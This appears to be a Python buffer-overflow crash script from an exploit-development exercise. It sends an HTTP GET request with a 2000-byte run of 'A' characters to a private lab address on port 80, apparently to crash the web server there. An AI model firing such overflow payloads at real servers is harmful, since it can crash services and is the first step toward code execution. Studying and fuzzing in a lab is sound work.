#!/usr/bin/python
# -*- coding: UTF-8 -*-
# Autor: 1º Ten Chitolina - 0x4rt3mis


import socket
import sys
from struct import pack

payload = b"A" * 2000

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

connect = s.connect(('192.168.122.49',80))

s.send(b'GET ' + payload + b' HTTP/1.1\r\n\r\n')
s.close()
